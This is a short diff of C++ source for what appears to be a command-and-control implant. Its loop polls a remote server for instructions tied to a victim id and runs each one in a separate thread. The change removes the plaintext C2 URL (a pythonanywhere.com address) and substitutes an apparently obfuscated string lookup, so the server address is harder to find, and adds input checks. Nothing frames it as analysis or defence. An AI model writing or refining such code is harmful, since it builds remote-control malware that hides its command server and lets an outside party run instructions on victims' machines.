@@ -4,8 +4,9 @@
 #include <unordered_set>
 #include <thread>
 
-#include "string_functions.hh"
 #include "request.hh"
+#include "strings.hh"
+#include "string_functions.hh"
 
 #include "c2.hh"
 #include "instructions_api.hh"
@@ -29,9 +30,10 @@ int main() {
     while (true) {
 
         // receive instructions
-        for (std::string ins: split_string(get_request("http://0x3af72.pythonanywhere.com/instructions/?u=" + id), INSTRUCTION_SEP_TOKEN)) {
+        for (std::string ins: split_string(get_request(cs(instructions_address) + id), INSTRUCTION_SEP_TOKEN)) {
             if (!ins.size()) continue;
             std::vector<std::string> values = split_string(ins, INSTRUCTION_VAL_SEP_TOKEN);
+            if (values.size() < 2) continue;
             if (seen_instructions.find(values[0]) != seen_instructions.end()) continue;
             seen_instructions.insert(values[0]);
             std::thread t(perform, id, values);
